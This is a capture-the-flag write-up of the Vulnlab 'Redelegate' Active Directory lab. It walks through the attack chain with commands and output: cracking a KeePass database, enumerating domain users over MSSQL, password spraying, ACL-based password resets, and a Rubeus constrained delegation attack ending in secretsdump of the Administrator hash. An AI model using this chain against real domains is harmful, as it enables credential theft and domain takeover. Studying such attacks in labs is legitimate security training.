---
title: Redelegate - Vulnlab
date: 2026-02-22 12:25:45
tags: [vulnlab, HacktheBox, Hard]
categories: vulnlab, HacktheBox
keywords: 'Vulnlab, HacktheBox, Hard, Windows'
description: Redelegate is a Hard difficulty Active Directory machine that focuses on testing enumeration creativity and delegation attacks. Attack paths include exploiting bad password strength and ACL misconfigurations, finished by a constrained delegation attack that allows us to compromise a domain controller.
cover: /images/vulnlab/redelegate-vl/redelegate_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

Redelegate is a continuation of the delegation-related machines, which is another AD machine that tests creative enumeration and AD traversal. 

The predecessor to this machine, [Delegate]([Delegate - Vulnlab | daz](https://daz-dev.tech/2024/06/30/delegate/)), involved us exploiting a few ACL misconfigurations and finished off with exploitation of the `SeEnableDelegationPrivilege`. This permission can "Enable computer and user accounts to be trusted for delegation", meaning that domain object can request for TGTs or access services on behalf of another user.

Redelegate places a bit of a spin on our delegation attack path, as the environment has been slightly hardened and does not allow domain users to add computers into the domain (MAQ = `0`).

---

# Service Enumeration

With our entry point spawned, we can start by scanning the network and viewing the ports that are available to us.

```
└─$ nmap 10.129.3.20 -T3
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

We notice a few ports of interest, specifically FTP, MSSQL, and LDAP (indicating that this is likely a DC). We can enumerate the domain name and append all name information to our `/etc/hosts` file.

```
└─$ netexec ldap 10.129.3.20
LDAP   10.129.3.20    389    DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)

└─$ echo '10.129.3.20 redelegate.vl DC.redelegate.vl DC' | sudo tee -a /etc/hosts
10.129.3.20 redelegate.vl DC.redelegate.vl DC
```

HTTP is also open on port 80, however the site appears to just be the default IIS webpage. We can also rule out `ADCS` due to the non-existence of the `/certsrv` endpoint (or verified with `netexec` and `-M adcs`, though we need valid domain credentials to prove this first.)

We can take a look at FTP or SMB first, as those are likely our only starting vectors at this point.

```
└─$ netexec ftp redelegate.vl -u 'Anonymous' -p ''
FTP         10.129.3.20    21     redelegate.vl    [+] Anonymous:

└─$ netexec smb redelegate.vl -u '' -p ''
SMB         10.129.3.20    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.20    445    DC               [+] redelegate.vl\:
```

We can see that both FTP and SMB allow for anonymous login, however visibility on the SMB shares is restricted (you can test this by attempting to access the SMB service with NULL auth). We can start with FTP and enumerate what files are on that application.

```
└─$ ftp redelegate.vl
Connected to redelegate.vl.
220 Microsoft FTP Service
Name (redelegate.vl:daz): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||63378|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
```

We can see a few files in particular, notably a few text files and a `KeePass` database. This `kdbx` file is likely housing credentials in some form - so this is likely the first step that we need to take.

With `KeePass` databases in particular, we need the master password in order to access the central database - so we're a bit stuck until we find some way to authenticate to it. Note that we need to make sure we're in binary mode when we download the `kdbx` file or else it will be interpreted in ASCII format.

```
ftp> binary
200 Type set to I.
ftp> prompt OFF
Interactive mode off.
ftp> mget *
local: CyberAudit.txt remote: CyberAudit.txt
229 Entering Extended Passive Mode (|||63389|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   434        6.86 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:00 (6.81 KiB/s)
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||63390|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  2622       41.97 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (41.63 KiB/s)
local: TrainingAgenda.txt remote: TrainingAgenda.txt
229 Entering Extended Passive Mode (|||63391|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   580       13.65 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:00 (13.54 KiB/s)
```

We can look into the two text files to see if they provide any context.

```
└─$ cat CyberAudit.txt
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

This file tells us that there are a few items that are in progress from a recent cyber audit in the tenant. As it tells us, this involves weak passwords and ACL modifications. We can see that the unused AD objects and ACL misconfigurations have not been completed yet, likely indicating that we'll be able to take advantage of them at some point in the attack chain.

```
└─$ cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one

Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password

Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

There's a bit of junk info here, specifically it relates to a training agenda for new workers. The key information here that's interesting is `"Weak Passwords" - Why "SeasonYear!" is not a good password`, which relates to password strength. It's relatively common for users to use basic password combinations such as `Company` + `Year` + `special character` or something of the sort.

---

# Cracking the KeePass Database

It's likely in this case that `SeasonYear!` was used intentionally as there were likely some users that used this password combination before. We also likely already have password, as the `CyberAudit.txt` file tells us that the current month and year in this scenario is `October 2024` - which tells us the password is probably `Fall2024!` or `Autumn2024!`.

The only issue at the moment is that we don't have any domain users at the moment to test potential credentials against, only the `kdbx` file. We'll focus on this before getting other user accounts.

As mentioned previously, `Fall2024!` or `Autumn2024!` is likely the password. That being said, I saw a good use-case for a Python script I made a few months ago that generates passwords based off terminology; such as company names or seasons. You can find the script [here]([DaZ-CYBER/spraygen: A password creation tool for password spraying](https://github.com/DaZ-CYBER/spraygen)).

We can use that script to generate us a list of passwords, specifically focusing on seasons and years. We'll make our year value window relatively small - let's do `2022-2026`.

```
└─$ python3 ~/exec/spraygen/pypassgen.py -s -y '2022-2026' | grep '!' | tee -a spray.list
Summer2022!
Autumn2025!
[...snip...]
Winter2024!
Fall2023!
```

We'll need to then convert the `kdbx` file into a format that `JTR` can process, we can use `keepass2john` for this.

```
└─$ keepass2john Shared.kdbx | tee shared.hash
Shared:$keepass$*2*60[...snip...]4502c
```

We can then use our recently created wordlist and the `KeePass` database hash and attempt to crack the master password for it. Note that I've already cracked it previously as seen below.

```
└─$ john shared.hash -w=./spray.list

└─$ john --show shared.hash
Shared:[...snip...]
1 password hash cracked, 0 left
```

I've blocked the password in the output above, however now we should have the master password for the `KeePass` database. There are a few ways to access these, notably [kpcli]([rebkwok/kpcli: Command line interface for keepass database](https://github.com/rebkwok/kpcli)) or [KeePassXC]([KeePassXC Password Manager](https://keepassxc.org/)) - I'll detail it with `KeePassXC` to show the GUI version (and since I already have it installed).

We can open the database by selecting `Database > Open Database` and browsing to `Shared.kdbx`. We'll then enter the master password so we can access the file.

![](/images/vulnlab/redelegate-vl/b.png)

There's a bit of good info here, however we can rule out a lot of password candidates.

* `X FS01 Admin` - as an actual `FS01` machine is not in our scope, or at least we don't know of it yet.
* `X FTP` - we already have access to FTP and the ability to write files to FTP likely doesn't matter - as there is no webserver that would make this an attack option.
* `X WEB01` - There is no existence of a `WordPress` application in our scope.
* `+ SQL Guest Access` - There is an MSSQL service, so we can test if these credentials are usable.

I won't show the password itself, however you can view it by selecting `SQL Guest Access` and then the unhide icon next to the bulleted password.

You can then test authentication via `netexec` or directly authenticate to the service with local authentication, as seen below.

```
└─$ impacket-mssqlclient -dc-ip 10.129.3.20 SQLGuest:'z[...snip...]i'@10.129.3.20
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)>
```

---

# Domain RID Enumeration through MSSQL

After accessing MSSQL through `Impacket` and our valid credentials, we can begin to enumerate to see if there are any ways to escalate our privileges.

Our normal methodology in MSSQL would involve seeing if there are any users we can impersonate any users or if there are any external links we can access on the server. To summarize:

* `> enum_impersonate` - There are no users we can impersonate on the MSSQL server
* `> enum_links` - There doesn't appear to be any links we can enumerate and connect to from the DC server.
* `> enum_logins` - The only other possible SQL login on the server is from `sa` (the database admin), however it's disabled.
* `> enum_users` - The only users that are available for login (excluding `INFORMATION_SCHEMA` and `sys`) are the `sa` user and our `SQLGuest` account. Domain authentication is likely possible however that doesn't help us as we don't have any domain users available.

```
SQL (SQLGuest  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------

SQL (SQLGuest  guest@master)> enum_links
SRV_NAME                     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE               SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------------------------   ----------------   -----------   --------------------------   ------------------   ------------   -------
WIN-Q13O908QBPG\SQLEXPRESS   SQLNCLI            SQL Server    WIN-Q13O908QBPG\SQLEXPRESS   NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------

SQL (SQLGuest  guest@master)> enum_logins
name       type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
--------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa         SQL_LOGIN             1          1               0             0            0              0           0           0           0
SQLGuest   SQL_LOGIN             0          0               0             0            0              0           0           0           0

SQL (SQLGuest  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID
------------------   --------   ---------   ---------   -------------   ----------   -----
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'
guest                public     NULL        NULL        guest           b'2         '   b'00'
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL
sys                  public     NULL        NULL        NULL            b'4         '    NULL
```

There also doesn't appear to be any information within any of the databases on the MSSQL server, thus any further credential theft through this service doesn't seem to be possible.

With not many options left, we need to reconsider a premise that we recently used to gain access to the `Shared.kdbx` file. As explained in the training agenda, we can interpret that there could be other users that have weak passwords similar to the one we found for the `KeePass` database.

At the moment though, we have no way to enumerate possible usernames. We could use tools like `kerbrute` to brute force the users through Kerberos - however that's relatively tedious and isn't guaranteed that we can find users if they don't exist in our user list.

There is another way to enumerate users - specifically through a domain joined MSSQL service. A much larger article that describes this process can be found [here]([Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda)), however to summarize:

It is possible to enumerate domain users via standard queries. This involves utilizing the "`SUSER_SID`" function, which will return to us the SID of the domain and the group we are trying to enumerate. By concatenating the SID value and the RID value of a domain object, we can affectively search that domain objects name via the "`SUSER_SNAME`" function.

Let's see this in a more practical example - where we try to find enumerate the `Administrator` user. This user's RID is generally `500`, so we'll use that as our basis. We need to first grab the domain NETBIOS name:

```
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN();
----------
REDELEGATE
```

It makes sense for us to enumerate the `Domain Users` group since we're trying to find users on the domain, so we'll use "`SUSER_SID`" on that group.

```
SQL (SQLGuest  guest@master)> SELECT SUSER_SID('REDELEGATE\Domain Users');
-----------------------------------------------------------
b'010500000000000515000000a185deefb22433798d8e847a01020000'
```

As mentioned before, this is the domain SID and the RID of the domain user group in hexadecimal format, which is exactly 32 bytes. We can think of it as `0x010500000000000515000000a185deefb22433798d8e847a01020000`.

The last 8 bytes `01020000` contains the RID of the domain object we're looking at, specifically `Domain Users`. In order to convert this to the RID of the Administrator user object, we'll remove the last 8 bytes and convert the value `500` to hex. To do this, we can use the Programming interface in the Windows Calculator `calc.exe` and retrieve the `HEX` value.

* Domain SID (Hex): `0x010500000000000515000000a185deefb22433798d8e847a`
* Administrator RID: `500`

![](/images/vulnlab/redelegate-vl/c.png)

As we can see from the above, the value is `1f4`. We'll need to append another `0` to the beginning of the value to make sure its a total of 4 bytes, which is `01f4`.

Next, we'll need to convert it to little endian format, so we'll switch the first two bytes and last two bytes. That'll leave us with `f401`.

Lastly, we'll append 4 more `0`'s to the end of our hex value so that it contains a total of 8 bytes. To summarize:

* Domain SID (Hex): `0x010500000000000515000000a185deefb22433798d8e847a`
* Administrator RID: `500`
* Administrator RID (Hex): `1f4` + `0` = `01f4` -> Little endian format `f401`
* Last 4 bytes appended = `f4010000`
* Domain SID + RID (Hex): `0x010500000000000515000000a185deefb22433798d8e847af4010000`

Now that we have the full domain SID+RID, we can validate its value in MSSQL.

```
SQL (SQLGuest  guest@master)> SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847af4010000)
-----------------------------
WIN-Q13O908QBPG\Administrator
```

As intended, we know that the `Administrator` user exists and its name is returned to us. If this RID did not exist, we wouldn't get anything output in return.

In order to perform enumeration across users in the domain, we'd need an automated way to do this since we can only check user existence one-by-one. I've also written a Python script that performs the RID conversion and enumerates users through the `pymssql` library. You can find that script [here]([DaZ-CYBER/mssql_domain_user_enum: This Python script is designed to enumerate domain users via MSSQL statements, specifically `SUSER_SNAME()`.](https://github.com/DaZ-CYBER/mssql_domain_user_enum)).

```
└─$ python3 mssql_enum/mssql_domain_user_enum.py -h
usage: mssql_domain_user_enum.py [-h] -s SERVER [-pt PORT] -u USERNAME -p PASSWORD [-mi MINIMUM_RID] [-ma MAXIMUM_RID] [-o OUTPUT]

Tool for Domain User Enumeration via MSSQL by DaZ

options:
  -h, --help            show this help message and exit
  -s, --server SERVER   target server (IP or Domain)
  -pt, --port PORT      target MSSQL port (default: 1433)
  -u, --username USERNAME
                        username to authenticate as
  -p, --password PASSWORD
                        password to authenticate as
  -mi, --minimum-rid MINIMUM_RID
                        minimum RID value for enum (default: 500)
  -ma, --maximum-rid MAXIMUM_RID
                        maximum RID value for enum (default: 512)
  -o, --output OUTPUT   return output to user-list file
```

We can use an RID range of 1100-1250 to avoid as many default group objects as possible.

```
└─$ python3 ../mssql_enum/mssql_domain_user_enum.py -s redelegate.vl -u SQLGuest -p 'z[...snip...]i' -mi 1100 -ma 1250
[*] Testing connection to redelegate.vl...
[+] Connection to redelegate.vl established successfully.
[*] Extracting domain NETBIOS name...
[+] Retrieved domain: REDELEGATE
[*] Extracting SID for group Domain Users...
[+] Retrieved SID: 0x010500000000000515000000a185deefb22433798d8e847a
[+] Found User: REDELEGATE\FS01$
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\Helpdesk
[+] Found User: REDELEGATE\IT
[+] Found User: REDELEGATE\Finance
[+] Found User: REDELEGATE\DnsAdmins
[+] Found User: REDELEGATE\DnsUpdateProxy
[+] Found User: REDELEGATE\[...snip...]
[+] Found User: REDELEGATE\[...snip...]
```

As seen from the above, we have a list of usernames we can potentially test credentials for. We can save this list by re-running the script and using the `-o` to output the results to a file.

```
└─$ python3 mssql_enum/mssql_domain_user_enum.py -s redelegate.vl -u SQLGuest -p 'z[...snip...]i' -mi 1100 -ma 1250 -o ul.txt
......
[*] Usernames written to "ul.txt"
```

Now that we have a valid list of domain users, lets use the password we obtained from cracking the `KeePass` database and spray it amongst these users. Note that I've also cleaned up the user list and removed entries such as `Helpdesk` and `DnsAdmins`.

```
└─$ netexec ldap redelegate.vl -u ul.txt -p '[...snip...]'
LDAP        10.129.3.20     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.3.20     389    DC               [-] redelegate.vl\FS01$:[...snip...]
LDAP        10.129.3.20     389    DC               [-] redelegate.vl\Christine.Flanders:[...snip...]
LDAP        10.129.3.20     389    DC               [+] redelegate.vl\Marie.Curie:[...snip...]
```

We can see that the user `Marie.Curie` shares the same password.

---

# ACL Abuse - Marie.Curie -> Helen.Frost

Now that we have a valid domain user, we can pull all domain information and ingest it into Bloodhound for visualization.

```
└─$ bloodhound-python -d redelegate.vl -u Marie.Curie -p '[...snip...]' -c all -ns 10.129.3.20 --zip -op redelegate_bloodhound
```

We'll look specifically at `Marie.Curie`'s domain object to see if there's any important outbound object controls (ACLs that give us a privilege over another domain object).

![](/images/vulnlab/redelegate-vl/d.png)

We can see that the user `Marie.Curie` is a member of `HELPDESK`, meaning they have `ForceChangePassword` rights over six domain users within the domain.

Within the list of users that we have this ACL privilege over, the user `Helen.Frost` appears to be the most important. This is due to the fact that this user is within the RMO (Remote Management Operators) domain group, meaning they can access the machine via WinRM.

We'll focus on this user for now, as the exploitation process is relatively simple.

```
└─$ bloodyAD -d redelegate.vl -u 'Marie.Curie' -p '[...snip...]' --dc-ip 10.129.3.20 set password 'Helen.Frost' 'dazd3z123@'
[+] Password changed successfully!
```

Let's then test these credentials with `netexec` to make sure the change went through.

```
└─$ netexec ldap redelegate.vl -u 'Helen.Frost' -p 'dazd3z123@'
LDAP        10.129.3.20     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.3.20     389    DC               [+] redelegate.vl\Helen.Frost:dazd3z123@
```

We can then authenticate to the WinRM service using `evil-winrm` and retrieve the first user flag.

```
└─$ evil-winrm -i redelegate.vl -u 'Helen.Frost' -p 'dazd3z123@'

Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cat C:\Users\Helen.Frost\Desktop\user.txt
[...snip...]
```

---

# Constrained Delegation Abuse

Now that we have access to the WinRM, we could enumerate our privileges or user tokens and see if there are any other ways to escalate privileges within the domain.

```
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

We can see that much like in the Delegate machine, we have the `SeEnableDelegationPrivilege` enabled on the `Helen.Frost` account.

As mentioned from my previous article, this privilege allows a user to act on behalf of another user or object. 

The only catch here is that in the previous scenario, we had a Machine Account Quota (MAQ) of 10 - which allowed us to add computers to the domain and exploit unconstrained delegation. 

```
└─$ netexec ldap redelegate.vl -u 'Helen.Frost' -p 'dazd3z123@' -M maq
LDAP        10.129.3.20     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.3.20     389    DC               [+] redelegate.vl\Helen.Frost:dazd3z123@
MAQ         10.129.3.20     389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.3.20     389    DC               MachineAccountQuota: 0
```

We don't have that here, however we do have an alternative route in AD. `Helen.Frost` contains an outbound object control, specifically onto a machine object - `FS01$`.

![](/images/vulnlab/redelegate-vl/e.png)

We have `GenericAll` over this account, meaning we essentially have full control and can reset any properties we need. For a machine account in particular, we can easily just reset the password.

```
└─$ bloodyAD -d redelegate.vl -u 'Helen.Frost' -p 'dazd3z123@' --dc-ip 10.129.3.20 set password 'FS01$' 'dazd3z123@'
[+] Password changed successfully!

└─$ netexec ldap redelegate.vl -u 'FS01$' -p 'dazd3z123@'
LDAP        10.129.3.20     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.3.20     389    DC               [+] redelegate.vl\FS01$:dazd3z123@
```

Now that we control a machine account, we can enumerate what we can do with our delegation privileges.

We can start by laying out specifically what delegation exploits are available to us - `unconstrained delegation`, `constrained delegation`, and `resource-based constrained delegation`. I'll outline how each of these specific delegation exploits work and the one we'll be using in our scenario. We'll also try using [PowerView]([PowerTools/PowerView/powerview.ps1 at master · PowerShellEmpire/PowerTools](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)) to enumerate these delegation exploits.

* **Unconstrained Delegation**: This privilege allows a user or machine to act on behalf of another user to another service, however the base principal is that the specific user or service in question is unrestricted - it can be any user or service.

For DC's, they will always appear as vulnerable to unconstrained delegation. Another machine account is needed to complete this exploit.

```
*Evil-WinRM* PS C:\Windows\Tasks> Get-DomainComputer -Unconstrained -Properties name

name
----
DC
```

* **Constrained Delegation**: Much similar to unconstrained delegation, however slightly more hardened. It restricts specifically which service the server or machine account in question can act on behalf of, and the server will no longer cache the TGTs of other users. This exploit is possible via modification of the `msDS-AllowedToDelegateTo` front-end (user/service specific) attribute.
	* This implements two types of TGS requests dependent on the `userAccountControl` attribute of the requester, `S4U2Self` and `S4U2Proxy`.

Note that if an account is marked as "`Account is sensitive and cannot be delegated`", then we will not be able to impersonate them.

```
*Evil-WinRM* PS C:\Windows\Tasks> Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
(No Output)
```

* **Resource-based Constrained Delegation (RBCD)**: A spin on constrained delegation that focuses on delegation to the backend service rather than the front-end attribute. Modification of this involves changing the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to impersonate a user or service. This delegation attribute applies to the service itself, not the machine requesting it.
	* The `AllowedToActOnBehalfOfOtherIdentity` attribute must be set to the SID of the object in question, however this does not require our `SeEnableDelegationPrivilege` token that `Helen.Frost` has.

So which is it? Well, as mentioned, we can't add computers to the domain due to our MAQ being `0`, which rules out both unconstrained (we also can't create DNS entries on the DC) and RBCD since we'd have to have the configuration set on a machine account first.

Constrained delegation would be possible, but we'd need a machine account first in order to make that happen. We can likely make use of the `FS01` machine account that we reset the password of recently.

We can first start by modifying the `msDS-AllowedToDelegateTo` attribute on `FS01` to include an SPN.

```
*Evil-WinRM* PS C:\Windows\Tasks> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Replace @{"msDS-AllowedToDelegateTo"="LDAP/DC.redelegate.vl"}
```

We can then enable the `-TrustedToAuthForDelegation` attribute so this machine account can properly impersonate on behalf of another user.

```
*Evil-WinRM* PS C:\Windows\Tasks> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

Moving on, we can use [Rubeus]([GhostPack/Rubeus: Trying to tame the three-headed dog.](https://github.com/GhostPack/Rubeus)) to request a TGT for the `FS01` machine account and import it into the current session.

```
*Evil-WinRM* PS C:\Windows\Tasks> .\Rubeus.exe asktgt /user:FS01$ /password:'dazd3z123@' /domain:redelegate.vl /nowrap /ptt

[*] Action: Ask TGT
[*] Using rc4_hmac hash: D8999B3B1F44093D1797F9B4D980A936
[*] Building AS-REQ (w/ preauth) for: 'redelegate.vl\FS01$'
[*] Using domain controller: 10.129.3.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFYjCC[...snip...]dmw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/redelegate.vl
  ServiceRealm             :  REDELEGATE.VL
  UserName                 :  FS01$ (NT_PRINCIPAL)
  UserRealm                :  REDELEGATE.VL
  StartTime                :  2/21/2026 10:33:27 PM
  EndTime                  :  2/22/2026 8:33:27 AM
  RenewTill                :  2/28/2026 10:33:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  cvS[...snip...]M1Q==
  ASREP (key)              :  D89[...snip...]A936
```

Then, we'll take that ticket we just produced to build `S4U2Self` and `S4U2Proxy` requests impersonating the `DC$` machine account.

```
*Evil-WinRM* PS C:\Windows\Tasks> .\Rubeus.exe s4u /ticket:doIFYjC[...snip...]WdhdGUudmw= /impersonateuser:DC$ /domain:redelegate.vl /msdsspn:LDAP/DC.redelegate.vl /dc:DC.redelegate.vl /ptt /nowrap

[*] Building S4U2self request for: 'FS01$@REDELEGATE.VL'
[*] Using domain controller: DC.redelegate.vl (10.129.3.20)
[*] Sending S4U2self request to 10.129.3.20:88
[+] S4U2self success!
[*] Got a TGS for 'DC$' to 'FS01$@REDELEGATE.VL'
[*] base64(ticket.kirbi):
doIFg[...snip...]TAHGwVGUzAxJA==
[...snip...]
[*] Impersonating user 'DC$' to target SPN 'LDAP/DC.redelegate.vl'
[*] Building S4U2proxy request for service: 'LDAP/DC.redelegate.vl'
[*] Using domain controller: DC.redelegate.vl (10.129.3.20)
[*] Sending S4U2proxy request to domain controller 10.129.3.20:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'LDAP/DC.redelegate.vl':
doIGMD[...snip...]2bA==
[+] Ticket successfully imported!
```

This gives us the forged TGS that we can use to authenticate to the DC as the `DC$` machine account. We can take that base64-encoded TGS blob from the `S4U2Proxy` request and bring it back to our local machine. We'll need to convert it from a `.kirbi` to a `.ccache` file in order to use it alongside `Impacket`.

```
└─$ echo 'doIGM[...snip...]52bA==' | base64 -d > ticket.kirbi
```

We'll use `ticketConverter` which comes alongside the `Impacket` suite in order to convert it to a `.ccache` file.

```
└─$ impacket-ticketConverter ticket.kirbi ticket.ccache
[*] converting kirbi to ccache...
[+] done
```

Finally we can use the `.ccache` TGS via an environment variable and attempt the dump the secrets for the `Administrator` user.

```
└─$ export KRB5CCNAME=ticket.ccache

└─$ impacket-secretsdump -just-dc-ntlm -just-dc-user Administrator -k DC.redelegate.vl
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[...snip...]:[...snip...]:::
[*] Cleaning up...
```

As seen from the above, we were successfully able to impersonate the `DC$` machine account and dump the secrets (specifically the NTLM hash) for the `Administrator` user. We can now plug this into WinRM and authenticate as them to read the root flag.

```
└─$ evil-winrm -i redelegate.vl -u Administrator -H '[...snip...]'
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
[...snip...]
```

---

# Conclusion

That essentially concludes the machine. To summarize, we:

* Enumerated services initially and found anonymous login on the FTP service.
* Discovered a potential password combination via a training agenda and cyber audit.
* Cracked a `KeePass` database with the password combination.
* Accessed the MSSQL service using Guest account credentials from the `KeePass` database.
* Enumerated domain users through RID reversing.
* Discovered that a user was sharing the same credentials as the `KeePass` database master password.
* Exploiting ACL misconfigurations to take control of a user that had WinRM access to the DC.
* Reset the password for the `FS01` machine account
* Exploited constrained delegation using `FS01` to dump the secrets for the `Administrator` user.

I highly suggest reading [xct's writeup]([VL Redelegate | xct's blog](https://vuln.dev/vulnlab-redelegate/)) on this machine as he goes a little bit more in-depth on how this delegation exploit works. There are also plenty of other resources such as through [HackTricks]([Constrained Delegation - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html)) or even [here]([The Most Dangerous User Right You (Probably) Have Never Heard Of – harmj0y](https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)).

[Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda)
[Delegate - Vulnlab | daz](https://daz-dev.tech/2024/06/30/delegate/)
[SeEnableDelegationPrivilege | TLDRBins](https://tldrbins.github.io/seenabledelegationprivilege/)
[Constrained Delegation - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html)
[The Most Dangerous User Right You (Probably) Have Never Heard Of – harmj0y](https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)
[VL Redelegate | xct's blog](https://vuln.dev/vulnlab-redelegate/)